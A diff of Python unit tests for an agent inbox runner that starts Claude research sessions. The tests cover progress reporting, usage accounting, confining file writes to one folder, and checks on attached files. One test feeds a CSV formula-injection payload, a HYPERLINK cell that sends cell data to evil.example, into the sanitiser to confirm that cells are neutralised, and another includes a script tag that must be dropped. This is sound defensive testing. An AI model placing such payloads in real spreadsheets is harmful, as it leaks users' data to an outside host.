@@ -8,7 +8,7 @@ import socket
 import time
 import unittest
 from datetime import timedelta
-from pathlib import Path, PureWindowsPath
+from pathlib import Path, PurePosixPath, PureWindowsPath
 from unittest import mock
 
 from inbox_support import REAL_RESOLVE_HOST, FakeUnio, HomeCase, inbox, write_fake_claude
@@ -461,7 +461,7 @@ class Run(HomeCase):
         self.assertEqual(self.once("research"), 0)
         session, = self.sessions()
         argv = session["argv"]
-        self.assertEqual(argv[argv.index("--tools") + 1], "WebSearch,WebFetch")
+        self.assertEqual(argv[argv.index("--tools") + 1], "WebSearch,WebFetch,Write")
         self.assertTrue(argv[argv.index("--append-system-prompt-file") + 1].endswith("researcher.md"))
         self.assertIn("Research limits:", session["prompt"])
         self.assertEqual(session["headers"], ["Authorization", "X-Unio-Inbox-Claim", "X-Unio-Inbox-Item"])
@@ -472,12 +472,23 @@ class Run(HomeCase):
         self.assertTrue(item["run"].endswith("-research"))
         self.assertEqual(item["web"], {"searches": 1, "fetches": 1, "sources": 1})
         self.assertEqual(item["usage"]["model"], "claude-test")
+        self.assertEqual(done["research"], {"end": "complete"})
+        self.assertEqual(done["usage"], {"turns": 12, "model": "claude-test", "inputTokens": 10, "outputTokens": 5,
+                                         "cacheReadTokens": 1, "cacheWriteTokens": 2, "costUsd": 0.0123,
+                                         "webSearches": 1, "webFetches": 1, "sources": 1, "files": 0,
+                                         "estimated": False})
         health = self.health()
         self.assertEqual(health["researchThreads"]["c-0001"]["comment"], "c-session-reply")
         self.assertEqual(health["sessions"][-1]["kind"], "research")
         self.assertEqual(health["quota"]["seven_day"]["utilization"], 0.5)
         progress = [r["body"]["step"] for r in self.fake.seen("POST", "/v1/agents/inbox/progress")]
         self.assertNotIn("reading_code", progress)
+        # The claim is marked research before the session connects, so the server narrows its tools.
+        calls = [(r["path"], r["body"]) for r in self.fake.seen() if r["path"] in ("/v1/agents/inbox/progress",
+                                                                                   "/v1/mcp")]
+        self.assertEqual(calls[0], ("/v1/agents/inbox/progress", {"key": "comment:c-0001",
+                                                                  "claimId": "claim-0001-fake",
+                                                                  "step": "reading_task", "mode": "research"}))
 
     def test_escalation_runs_research_under_the_same_claim(self):
         self.assertEqual(self.once("escalate", mention("@[Agent](user_agent) qual a alíquota de ISS?")), 0)
@@ -488,6 +499,8 @@ class Run(HomeCase):
         self.assertEqual(len(self.fake.seen("POST", "/v1/agents/inbox/complete")), 1)
         item, = self.items()
         self.assertEqual((item["research"]["why"], item["triage"]["turns"]), ("escalated", 3))
+        usage = self.fake.seen("POST", "/v1/agents/inbox/complete")[0]["body"]["usage"]
+        self.assertEqual((usage["turns"], usage["costUsd"]), (15, 0.0246), "both sessions of the claim")
         self.assertEqual([s.get("kind") for s in self.health()["sessions"]], [None, "research"])
 
     def thread(self):
@@ -514,6 +527,15 @@ class Run(HomeCase):
         item, = self.items()
         self.assertEqual(item["research"]["why"], "thread")
 
+    def test_a_run_the_server_did_not_mark_never_starts(self):
+        self.fake.research_mark_status = 500
+        self.assertEqual(self.once("research"), 0)
+        self.assertFalse(self.claude_log.exists())
+        release = self.fake.seen("POST", "/v1/agents/inbox/release")[0]["body"]
+        self.assertEqual(release["reason"], "unio_unavailable")
+        item, = self.items()
+        self.assertEqual(item["research"]["gate"], "research_unmarked")
+
     def test_a_gate_releases_without_a_session(self):
         state = self.state
         state.mkdir(parents=True, exist_ok=True)
@@ -524,6 +546,7 @@ class Run(HomeCase):
         self.assertFalse(self.claude_log.exists())
         release = self.fake.seen("POST", "/v1/agents/inbox/release")[0]["body"]
         self.assertEqual(release["reason"], "usage_limit")
+        self.assertNotIn("usage", release)
         self.assertNotIn("backoffUntil", {k for k, v in self.health().items() if v})
 
     def test_a_held_follow_up_goes_straight_to_research_next_time(self):
@@ -582,6 +605,28 @@ class Run(HomeCase):
         self.assertEqual(self.once("research"), 0)
         self.assertEqual(self.fake.seen("PUT", "/v1/comments/c-session-reply"), [])
         self.assertEqual(self.items()[0]["research"]["end"], "complete")
+
+    def test_a_file_reaches_the_answer(self):
+        self.assertEqual(self.once("research_file"), 0)
+        upload, = self.fake.seen("POST", "/v1/agents/inbox/files")
+        body = upload["body"]
+        self.assertEqual((body["key"], body["claimId"], body["commentId"], body["name"]),
+                         ("comment:c-0001", "claim-0001-fake", "c-session-reply", "dados-teste-2026.csv"))
+        self.assertNotIn("target", body)
+        self.assertTrue(body["content"].startswith("\ufeffmunicipio;aliquota;fonte\r\n"))
+        self.assertTrue(body["note"].startswith("Anexei dados-teste-2026.csv:"))
+        self.assertEqual(upload["headers"]["Idempotency-Key"],
+                         "unio-inbox:file:comment:c-0001:claim-0001-fake:dados-teste-2026.csv:comment")
+        self.assertNotIn("X-Unio-Inbox-Claim", upload["headers"])
+        done = self.fake.seen("POST", "/v1/agents/inbox/complete")[0]["body"]
+        self.assertEqual(done["usage"]["files"], 1)
+
+    def test_a_task_file_falls_back_to_the_answer(self):
+        self.fake.task_files_refused = True
+        self.assertEqual(self.once("research_file", mention("@[Agent](user_agent) pesquise e anexe na tarefa")), 0)
+        first, second = self.fake.seen("POST", "/v1/agents/inbox/files")
+        self.assertEqual((first["body"]["target"], "target" in second["body"]), ("task", False))
+        self.assertEqual(self.fake.seen("POST", "/v1/agents/inbox/complete")[0]["body"]["usage"]["files"], 1)
 
     def test_web_off_keeps_the_reply_run(self):
         os.environ["UNIO_INBOX_WEB"] = "off"
@@ -830,3 +875,283 @@ class Protocol(unittest.TestCase):
 
     def test_the_final_message_is_the_json_line_alone(self):
         self.assertIn("Your final message is the JSON line alone", self.text)
+
+
+class FakeCalls:
+    def __init__(self, answers=None):
+        self.bodies = []
+        self.answers = list(answers or [])
+
+    def call(self, method, path, body=None, idempotency_key=None, timeout=20):
+        self.bodies.append(dict(body))
+        return self.answers.pop(0) if self.answers else (200, {"data": {}})
+
+
+class LatestWins(unittest.TestCase):
+    def progress(self, api):
+        p = inbox.Progress(api, {"key": "k", "claimId": "c"}, lambda step: None)
+        return p
+
+    def test_a_step_inside_the_spacing_goes_out_later(self):
+        api = FakeCalls()
+        p = self.progress(api)
+        with mock.patch.object(inbox.time, "monotonic", return_value=100.0):
+            p.report("reading_task")
+        with mock.patch.object(inbox.time, "monotonic", return_value=101.0):
+            p.report("researching")
+            p.report("writing_reply")
+        self.assertEqual([b["step"] for b in api.bodies], ["reading_task"])
+        p.tick(102.9)
+        p.tick(103.0)
+        self.assertEqual([b["step"] for b in api.bodies], ["reading_task", "writing_reply"])
+
+    def test_heartbeat_repeats_the_latest(self):
+        api = FakeCalls()
+        p = self.progress(api)
+        with mock.patch.object(inbox.time, "monotonic", return_value=100.0):
+            p.report("researching")
+        p.tick(114.9)
+        self.assertEqual(len(api.bodies), 1)
+        p.tick(115.0)
+        self.assertEqual([b["step"] for b in api.bodies], ["researching", "researching"])
+        self.assertEqual(p.count, 2)
+
+
+class ResearchProgress(unittest.TestCase):
+    def progress(self, api, support=None):
+        return inbox.Progress(api, {"key": "k", "claimId": "c"}, lambda step: None, support)
+
+    def test_research_fields(self):
+        api = FakeCalls()
+        p = self.progress(api)
+        self.assertTrue(p.begin_research())
+        self.assertEqual(api.bodies[0], {"key": "k", "claimId": "c", "step": "reading_task", "mode": "research"})
+        p.report("reading_source", 3, 2, "www.gov.example")
+        p.tick(time.monotonic() + 3)
+        self.assertEqual(api.bodies[-1], {"key": "k", "claimId": "c", "step": "reading_source", "mode": "research",
+                                          "searches": 3, "sources": 2, "domain": "www.gov.example"})
+        self.assertTrue(p.support["reading_source"])
+        p.report("writing_reply", 3, 2, "www.gov.example")
+        p.tick(time.monotonic() + 6)
+        self.assertNotIn("domain", api.bodies[-1])
+
+    def test_a_reply_run_sends_no_fields(self):
+        api = FakeCalls()
+        p = self.progress(api)
+        p.report("reading_task", 1, 1, "x.example")
+        self.assertEqual(api.bodies, [{"key": "k", "claimId": "c", "step": "reading_task"}])
+
+    def test_an_older_server_refuses_the_fields(self):
+        api = FakeCalls([(422, {"code": "agent_field_forbidden", "field": "mode"})])
+        support = {"fields": True, "reading_source": None}
+        p = self.progress(api, support)
+        self.assertTrue(p.begin_research(), "the runner's own narrowing is all an older server has")
+        self.assertEqual(api.bodies[-1], {"key": "k", "claimId": "c", "step": "reading_task"})
+        self.assertEqual(p.count, 1)
+        self.assertFalse(support["fields"])
+        p.report("researching", 4, 1)
+        p.tick(time.monotonic() + 3)
+        self.assertNotIn("searches", api.bodies[-1])
+
+    def test_a_mark_the_server_never_took(self):
+        for answer in ((500, {"code": "server_error"}), (409, {"code": "agent_inbox_not_claimed"})):
+            self.assertFalse(self.progress(FakeCalls([answer])).begin_research(), answer)
+
+        class Unreachable:
+            def call(self, *args, **kwargs):
+                raise inbox.ApiUnreachable("timed out")
+
+        p = self.progress(Unreachable())
+        self.assertFalse(p.begin_research())
+        self.assertEqual(p.error, "timed out")
+
+    def test_an_older_server_refuses_reading_source(self):
+        refusal = (422, {"error": "Validation failed", "messages": [{"field": "step", "rule": "enum"}]})
+        api = FakeCalls([refusal])
+        support = {"fields": True, "reading_source": None}
+        p = self.progress(api, support)
+        p.mode = "research"
+        p.report("reading_source", 1, 0, "www.gov.example")
+        self.assertEqual([b["step"] for b in api.bodies], ["reading_source", "researching"])
+        self.assertIs(support["reading_source"], False)
+        self.assertTrue(support["fields"], "the fields stay")
+        self.assertNotIn("domain", api.bodies[-1])
+
+    def test_domain_rule(self):
+        self.assertEqual(inbox.progress_domain("https://WWW.Gov.Example./lei"), "gov.example")
+        self.assertEqual(inbox.progress_domain("https://www.gov.example/x"), "gov.example")
+        self.assertEqual(inbox.progress_domain("https://www2.example.org/"), "www2.example.org")
+        self.assertEqual(inbox.progress_domain("https://www.example/"), "www.example")
+        for url in ("http://8.8.8.8/", "https://[2001:db8::1]/", "not a url", None, "https://xn--d1a.example/"):
+            self.assertIn(inbox.progress_domain(url), (None, "xn--d1a.example"), url)
+        self.assertIsNone(inbox.progress_domain("http://8.8.8.8/"))
+
+
+class Settlement(HomeCase):
+    def runner(self):
+        self.profile("org_test")
+        return inbox.Runner(inbox.Config(dict(os.environ), "org_test"))
+
+    def test_usage_body(self):
+        body = inbox.usage_body({"model": "Claude-Opus-5-5[1m]", "turns": 1200, "inputTokens": 3 * 10**9,
+                                 "outputTokens": -4, "costUsd": 1.234567, "estimated": False},
+                                {"searches": 6, "fetches": 9, "sources": 8}, files=1)
+        self.assertEqual(body, {"turns": 999, "model": "claude-opus-5-5[1m]", "inputTokens": 2 * 10**9,
+                                "outputTokens": 0, "costUsd": 1.2346, "webSearches": 6, "webFetches": 9,
+                                "sources": 8, "files": 1, "estimated": False})
+        self.assertEqual(inbox.usage_body({"model": "claude opus", "turns": 2}, {}), {"turns": 2})
+        self.assertIsNone(inbox.usage_body(None, None, files=0))
+        merged = inbox.merge_usage({"turns": 3, "costUsd": 0.2, "model": "a", "estimated": False},
+                                   {"turns": 12, "costUsd": 1.0, "model": "b", "inputTokens": 5, "estimated": True})
+        self.assertEqual((merged["turns"], merged["costUsd"], merged["model"], merged["estimated"]), (15, 1.2, "b", True))
+
+    def test_an_older_server_gets_one_retry_without_them(self):
+        r = self.runner()
+        api = FakeCalls([(422, {"code": "agent_field_forbidden", "field": "usage"}), (200, {"data": {}})])
+        api.settle = lambda method, path, body, key, timeout=20: (api.keys.append(key), api.call(method, path, body))[1]
+        api.keys = []
+        item, claim = {"key": "k"}, {"claimId": "c"}
+        st, _ = r.settle(api, "complete", item, claim, outcome="replied", note="n", usage={"turns": 1},
+                         research={"end": "complete"})
+        self.assertEqual(st, 200)
+        self.assertEqual(api.bodies[-1], {"key": "k", "claimId": "c", "outcome": "replied", "note": "n"})
+        self.assertEqual(api.keys, ["unio-inbox:complete:k:c", "unio-inbox:complete:k:c:bare"])
+        r.settle(api, "complete", item, claim, outcome="replied", usage={"turns": 1})
+        self.assertNotIn("usage", api.bodies[-1], "not asked again of this server")
+
+    def test_a_bad_value_drops_them_for_this_settlement_only(self):
+        r = self.runner()
+        api = FakeCalls([(422, {"error": "Validation failed", "messages": [{"field": "usage.model"}]})])
+        api.settle = lambda method, path, body, key, timeout=20: api.call(method, path, body)
+        r.settle(api, "fail", {"key": "k"}, {"claimId": "c"}, error="e", usage={"model": "x"})
+        self.assertNotIn("usage", api.bodies[-1])
+        self.assertTrue(r.settle_extras)
+
+    def test_the_note_fallback_still_works(self):
+        r = self.runner()
+        api = FakeCalls([(422, {"code": "agent_field_forbidden", "field": "note"})])
+        keys = []
+        api.settle = lambda method, path, body, key, timeout=20: (keys.append(key), api.call(method, path, body))[1]
+        r.settle(api, "complete", {"key": "k"}, {"claimId": "c"}, outcome="replied", note="n")
+        self.assertEqual(keys, ["unio-inbox:complete:k:c", "unio-inbox:complete:k:c:plain"])
+
+
+class FilesProfile(HomeCase):
+    def test_write_is_confined_to_the_folder(self):
+        self.profile("org_test")
+        r = inbox.Runner(inbox.Config({**os.environ, "UNIO_INBOX_WEB": "on"}, "org_test"))
+        r.state.ensure()
+        argv = r.research_args(Path("/m.json"), ("WebSearch", "WebFetch"), Path("/state/runs/k/work/files-abcdefgh"))
+        self.assertEqual(argv[argv.index("--tools") + 1], "WebSearch,WebFetch,Write")
+        allowed = argv[argv.index("--allowedTools") + 1].split(",")
+        self.assertEqual(allowed[-1], inbox.files_rule(Path("/state/runs/k/work/files-abcdefgh")))
+
+    def test_the_rule_on_each_system(self):
+        self.assertEqual(inbox.files_rule(PurePosixPath("/home/u/state/work/files-abcdefgh"), windows=False),
+                         "Edit(//home/u/state/work/files-abcdefgh/**)")
+        self.assertEqual(inbox.files_rule(PureWindowsPath(r"C:\Users\U\AppData\Local\unio\work\files-abcdefgh"),
+                                          windows=True),
+                         "Edit(//c/Users/U/AppData/Local/unio/work/files-abcdefgh/**)")
+
+    def test_the_prompt_names_the_folder(self):
+        facts = {"web": ("WebSearch",), "minutes": 13, "turns": 60, "files": Path("/w/files-abcdefgh")}
+        text = inbox.build_prompt(mention(), [], 1, research=facts)
+        self.assertIn(f"Files: write only into {Path('/w/files-abcdefgh')}, and only when the \"Files\" rules", text)
+
+
+def csv_rows(n, sep=","):
+    return "\n".join([sep.join(["municipio", "aliquota", "fonte"])] +
+                     [sep.join([f"Cidade {i}", f'"{i % 5},0"' if sep == "," else f"{i % 5},0",
+                                f"https://www.gov.example/{i}"]) for i in range(n)]) + "\n"
+
+
+class FileChecks(HomeCase):
+    BODY = ("## Resposta\nA.\n\nAnexei **aliquotas-iss-2026.csv**: as 80 linhas com município e alíquota.\n\n"
+            "Anexei **relatorio-iss-2026.pdf**: o relatório completo para enviar ao cliente.")
+
+    def folder(self, files):
+        folder = self.tmp / "files-abcdefgh"
+        folder.mkdir()
+        for name, data in files.items():
+            (folder / name).write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))
+        return folder
+
+    def test_what_passes(self):
+        report = "# Relatório\n\n" + "\n".join(f"- Achado {i} com base na fonte oficial." for i in range(80))
+        kept, dropped = inbox.check_files(self.folder({"aliquotas-iss-2026.csv": csv_rows(80),
+                                                       "relatorio-iss-2026.md": report}), self.BODY)
+        self.assertEqual(dropped, [])
+        csv_file, pdf = sorted(kept, key=lambda f: f["name"])
+        self.assertTrue(csv_file["content"].startswith("﻿municipio;aliquota;fonte\r\n"))
+        self.assertIn("\r\nCidade 1;1,0;https://www.gov.example/1\r\n", csv_file["content"])
+        self.assertFalse(csv_file["render"])
+        self.assertEqual((pdf["shown"], pdf["render"]), ("relatorio-iss-2026.pdf", True))
+
+    def test_a_semicolon_csv_keeps_its_cells(self):
+        kept, _ = inbox.check_files(self.folder({"aliquotas-iss-2026.csv": csv_rows(80, ";")}), self.BODY)
+        self.assertIn("\r\nCidade 1;1,0;https://www.gov.example/1\r\n", kept[0]["content"])
+
+    def test_no_cell_runs_as_a_formula(self):
+        text = inbox.rewrite_csv('municipio,aliquota,fonte\nSP,2%,"=HYPERLINK(""https://evil.example/?d=""&A1)"\n'
+                                 'RJ,-5,@SUM(1+1)\nBH,+2.5%,"\tcmd"\nPOA,-1.234,5,+x\n')
+        rows = [line.split(";") for line in text.lstrip("\ufeff").split("\r\n") if line]
+        self.assertEqual(rows[1], ["SP", "2%", "\"'=HYPERLINK(\"\"https://evil.example/?d=\"\"&A1)\""])
+        self.assertEqual(rows[2], ["RJ", "-5", "'@SUM(1+1)"])
+        self.assertEqual(rows[3], ["BH", "+2.5%", "'\tcmd"])
+        self.assertEqual(rows[4], ["POA", "-1.234", "5", "'+x"])
+
+    def test_what_is_dropped(self):
+        big = "x" * (inbox.FILE_MAX_BYTES + 1)
+        files = {"aliquotas-iss-2026.csv": csv_rows(3), "Notas.md": "y" * 2000, "nao-citado-2026.md": "z\n" * 1000,
+                 "grande-2026.md": big, "relatorio-iss-2026.md": "# R\n\n<script>x</script>\n" + "w" * 2000,
+                 "dados.txt": "t" * 2000, "binario-2026.md": b"\xff\xfe" + b"a" * 2000}
+        folder = self.folder(files)
+        (folder / "pasta").mkdir()
+        body = self.BODY + " **grande-2026.md** **binario-2026.md** **Notas.md** **dados.txt**"
+        kept, dropped = inbox.check_files(folder, body)
+        self.assertEqual(kept, [])
+        self.assertEqual(dict(dropped), {"aliquotas-iss-2026.csv": "size", "Notas.md": "name",
+                                         "nao-citado-2026.md": "unnamed", "grande-2026.md": "size",
+                                         "relatorio-iss-2026.md": "markdown", "dados.txt": "name",
+                                         "binario-2026.md": "encoding", "pasta": "not_a_file"})
+
+    def test_a_file_that_repeats_the_comment(self):
+        lines = [f"- Achado {i} conferido." for i in range(100)]
+        body = "\n".join(lines) + "\n\nAnexei **resumo-2026.md**: o mesmo."
+        kept, dropped = inbox.check_files(self.folder({"resumo-2026.md": "\n".join(lines)}), body)
+        self.assertEqual(dropped, [("resumo-2026.md", "repeats_comment")])
+
+    @unittest.skipIf(os.name == "nt", "symlinks need privileges on Windows")
+    def test_a_link_is_never_followed(self):
+        outside = self.tmp / "segredo.md"
+        outside.write_text("s" * 2000, encoding="utf-8")
+        folder = self.folder({})
+        (folder / "segredo-2026.md").symlink_to(outside)
+        kept, dropped = inbox.check_files(folder, "**segredo-2026.md**")
+        self.assertEqual(dropped, [("segredo-2026.md", "not_a_file")])
+
+    def test_at_most_two_and_one_pdf(self):
+        report = "# R\n\n" + "\n".join(f"- Linha {i} do relatório." for i in range(100))
+        files = {f"r{i}-2026.md": report for i in range(3)}
+        body = "**r0-2026.pdf** **r1-2026.pdf** **r2-2026.md**"
+        kept, dropped = inbox.check_files(self.folder(files), body)
+        self.assertEqual([f["name"] for f in kept], ["r0-2026.md", "r2-2026.md"])
+        self.assertEqual(dropped, [("r1-2026.md", "second_pdf")])
+
+    def test_note_and_target(self):
+        self.assertEqual(inbox.file_note(self.BODY, "aliquotas-iss-2026.csv"),
+                         "Anexei aliquotas-iss-2026.csv: as 80 linhas com município e alíquota.")
+        self.assertEqual(len(inbox.file_note("Anexei **a-2026.md**: " + "x" * 400, "a-2026.md")), 200)
+        self.assertIsNone(inbox.file_note("**", "**"))
+        for text in ("pesquise e anexe na tarefa", "coloque no card a planilha", "Anexe a planilha na própria tarefa",
+                     "please attach it to the task", "@[Agent](u) research and put the CSV on the task",
+                     "suba o arquivo na tarefa", "salve na tarefa", "carregue a planilha no card",
+                     "não responda aqui: anexe na tarefa"):
+            self.assertTrue(inbox.wants_task_file(text), text)
+        for text in ("pesquise as alíquotas", "anexe a planilha", "attach the csv",
+                     "levante os subsídios jurídicos para a tarefa",
+                     "pesquise a substituição tributária aplicável na tarefa",
+                     "veja o prazo subsequente na tarefa", "address it to the task",
+                     "@[Bot](x) não anexe na tarefa, só responda", "pesquise e não coloque no card",
+                     "não precisa anexar na tarefa", "please don't put it on the task", "do not attach it to the task"):
+            self.assertFalse(inbox.wants_task_file(text), text)
